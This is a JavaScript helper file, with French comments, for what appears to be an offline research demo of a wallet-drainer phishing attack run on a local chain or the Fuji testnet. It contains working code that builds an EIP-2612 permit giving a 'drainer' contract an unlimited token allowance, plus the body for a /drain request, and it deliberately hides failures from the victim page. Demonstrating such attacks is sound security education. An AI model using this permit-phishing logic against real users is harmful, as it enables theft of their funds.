// Fonctions partagées entre index.html et attaquant.html. Aucune dépendance externe,
// aucun CDN : la démo doit tourner hors ligne. Charge ce fichier avant app.js / attaquant.js.
"use strict";

/* ======================= keccak-256 (sans bibliothèque) =======================
   Implémentation directe de Keccak-f[1600], uniquement pour calculer les sélecteurs
   de fonctions (ex. nonces(address)) nécessaires aux appels eth_call en lecture. */
(function (global) {
  var RC = [0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n, 0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n,
    0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an, 0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n,
    0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an, 0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n];
  var ROTC = [1, 3, 6, 10, 15, 21, 28, 36, 45, 55, 2, 14, 27, 41, 56, 8, 25, 43, 62, 18, 39, 61, 20, 44];
  var PILN = [10, 7, 11, 17, 18, 3, 5, 16, 8, 21, 24, 4, 15, 23, 19, 13, 12, 2, 20, 14, 22, 9, 6, 1];
  var M64 = (1n << 64n) - 1n;
  function rotl(x, n) { n = BigInt(n); return ((x << n) | (x >> (64n - n))) & M64; }
  function keccakf(st) {
    var bc = [0n, 0n, 0n, 0n, 0n], i, j, r, t;
    for (r = 0; r < 24; r++) {
      for (i = 0; i < 5; i++) bc[i] = st[i] ^ st[i + 5] ^ st[i + 10] ^ st[i + 15] ^ st[i + 20];
      for (i = 0; i < 5; i++) { t = bc[(i + 4) % 5] ^ rotl(bc[(i + 1) % 5], 1); for (j = 0; j < 25; j += 5) st[j + i] ^= t; }
      t = st[1];
      for (i = 0; i < 24; i++) { j = PILN[i]; var b0 = st[j]; st[j] = rotl(t, ROTC[i]); t = b0; }
      for (j = 0; j < 25; j += 5) { for (i = 0; i < 5; i++) bc[i] = st[j + i]; for (i = 0; i < 5; i++) st[j + i] ^= ((~bc[(i + 1) % 5]) & M64) & bc[(i + 2) % 5]; }
      st[0] ^= RC[r];
    }
  }
  function keccak256hex(bytes) {
    var rate = 136, st = []; for (var i = 0; i < 25; i++) st.push(0n);
    var len = bytes.length, padded = new Uint8Array(Math.ceil((len + 1) / rate) * rate);
    padded.set(bytes); padded[len] ^= 0x01; padded[padded.length - 1] ^= 0x80;
    for (var off = 0; off < padded.length; off += rate) {
      for (var k = 0; k < rate / 8; k++) { var lane = 0n; for (var b = 7; b >= 0; b--) lane = (lane << 8n) | BigInt(padded[off + k * 8 + b]); st[k] ^= lane; }
      keccakf(st);
    }
    var out = "";
    for (var l = 0; l < 4; l++) { var v = st[l]; for (var q = 0; q < 8; q++) { out += Number(v & 0xffn).toString(16).padStart(2, "0"); v >>= 8n; } }
    return out;
  }
  function selector(sig) { return "0x" + keccak256hex(new TextEncoder().encode(sig)).slice(0, 8); }
  global.keccak256hex = keccak256hex;
  global.selector = selector;
})(window);

/* ======================= encodage ABI minimal ======================= */
function pad32(hex) { return hex.replace(/^0x/, "").toLowerCase().padStart(64, "0"); }
function encAddr(a) { return pad32(a); }
function encUint(n) { return pad32(BigInt(n).toString(16)); }
function toHex(n) { return "0x" + BigInt(n).toString(16); }
function callData(sig, parts) { return selector(sig) + parts.join(""); }

const MAX_UINT256 = (1n << 256n) - 1n;

/* ======================= montants DemoUSDC (6 décimales) ======================= */
function formatUsdc(rawBigIntOrString) {
  var v = typeof rawBigIntOrString === "bigint" ? rawBigIntOrString : BigInt(rawBigIntOrString || 0);
  var neg = v < 0n; if (neg) v = -v;
  var whole = v / 1000000n, frac = (v % 1000000n).toString().padStart(6, "0").slice(0, 2);
  var withSep = whole.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
  return (neg ? "-" : "") + withSep + "," + frac;
}

/* ======================= choix du réseau =======================
   La page leurre ne montre jamais un nom de fichier ni une commande : resolveNet()
   essaie, dans l'ordre, (1) ?reseau=local|fuji si ce fichier d'adresses se charge,
   (2) le choix mémorisé par la console présentateur si son fichier se charge,
   (3) le premier fichier disponible (local d'abord). Le repli est silencieux pour
   la victime ; seule la console présentateur (attaquant.html) l'affiche. */
var NETS = ["local", "fuji"];
function explicitNet() {
  var q = (new URL(location.href).searchParams.get("reseau") || "").toLowerCase();
  return NETS.indexOf(q) >= 0 ? q : null;
}
function storedNet() {
  try { var s = localStorage.getItem("glacier.reseau"); return NETS.indexOf(s) >= 0 ? s : null; } catch (e) { return null; }
}
function rememberNet(net) { try { localStorage.setItem("glacier.reseau", net); } catch (e) {} }
// Lien interne qui conserve un choix de réseau explicite dans l'URL.
function pageUrl(page) {
  var q = explicitNet();
  return q ? page + "?reseau=" + q : page;
}

/* Copiées dans ce dossier par config.js depuis research/demo_reelle/chain/. Jamais lues
   directement dans chain/ : le serveur statique ne sert que ce dossier.
   Résultat : { ok:true, data } ou { ok:false, reason:"missing"|"invalid"|"network" }. */
async function loadAddresses(net) {
  try {
    var res = await fetch("./addresses." + net + ".json", { cache: "no-store" });
    if (!res.ok) return { ok: false, reason: "missing" };
    var data = await res.json();
    if (!data || !data.chainId || !data.usdc || !data.drainer || !data.rpcUrl || !data.victim) return { ok: false, reason: "invalid" };
    return { ok: true, data: data };
  } catch (e) {
    return { ok: false, reason: "network" };
  }
}

/* Résout le réseau effectif en essayant chaque candidat jusqu'au premier qui marche.
   Retourne { ok:true, net, data, requested, fellBack } ou { ok:false, requested, tried }
   quand aucun fichier d'adresses n'est exploitable (seul cas d'échec réel). */
async function resolveNet() {
  var requested = explicitNet() || storedNet() || "local";
  var order = [requested].concat(NETS.filter(function (n) { return n !== requested; }));
  var tried = [];
  for (var i = 0; i < order.length; i++) {
    var r = await loadAddresses(order[i]);
    tried.push({ net: order[i], reason: r.ok ? null : r.reason });
    if (r.ok) return { ok: true, net: order[i], data: r.data, requested: requested, fellBack: order[i] !== requested };
  }
  return { ok: false, requested: requested, tried: tried };
}

var FUJI_CHAIN_ID = 43113;
var FUJI_EXPLORER = "https://testnet.snowtrace.io";
function isFuji(chainId) { return Number(chainId) === FUJI_CHAIN_ID; }
// Lien explorateur : uniquement sur Fuji. En local il n'existe pas d'explorateur, donc null.
function explorerTxUrl(chainId, hash) {
  return isFuji(chainId) && /^0x[0-9a-fA-F]{64}$/.test(hash || "") ? FUJI_EXPLORER + "/tx/" + hash : null;
}

/* ======================= Permit EIP-2612 sur DemoUSDC =======================
   Domaine = celui de blockchain/contracts/demo/DemoUSDC.sol : ERC20Permit("Demo USDC"), version "1".
   owner = compte connecté, spender = le drainer, value = max uint256, échéance lointaine fixe. */
var PERMIT_DEADLINE = "4102444800"; // 1er janvier 2100, volontairement lointaine et déterministe
function buildPermit(addresses, owner, nonce) {
  return {
    types: {
      EIP712Domain: [
        { name: "name", type: "string" }, { name: "version", type: "string" },
        { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" },
      ],
      Permit: [
        { name: "owner", type: "address" }, { name: "spender", type: "address" },
        { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" },
      ],
    },
    primaryType: "Permit",
    domain: { name: "Demo USDC", version: "1", chainId: Number(addresses.chainId), verifyingContract: addresses.usdc },
    message: { owner: owner, spender: addresses.drainer, value: MAX_UINT256.toString(), nonce: String(nonce), deadline: PERMIT_DEADLINE },
  };
}
// Corps attendu par POST /drain de research/demo_reelle/chain/drain.mjs (parseRequest).
function buildDrainBody(addresses, owner, signature) {
  return { owner: owner, token: addresses.usdc, spender: addresses.drainer, value: MAX_UINT256.toString(), deadline: PERMIT_DEADLINE, signature: signature };
}

function shortAddr(a) { return a ? a.slice(0, 6) + "…" + a.slice(-4) : "—"; }

/* ======================= canal de diagnostic entre onglets =======================
   index.html (la victime) et attaquant.html (le présentateur) sont servis depuis la
   même origine (http://127.0.0.1:8791) : localStorage y est donc partagé entre onglets.
   On s'en sert pour remonter côté présentateur un détail technique (ex. compte connecté
   différent de la victime configurée) sans jamais l'afficher à la victime elle-même. */
function reportDemoError(code, detail) {
  try { localStorage.setItem("glacier.demoError", JSON.stringify({ code: code, detail: detail || "", at: Date.now() })); } catch (e) {}
}
function readDemoError() {
  try {
    var raw = localStorage.getItem("glacier.demoError");
    if (!raw) return null;
    var v = JSON.parse(raw);
    return v && Date.now() - v.at < 120000 ? v : null; // ignore un signal de plus de 2 min
  } catch (e) { return null; }
}
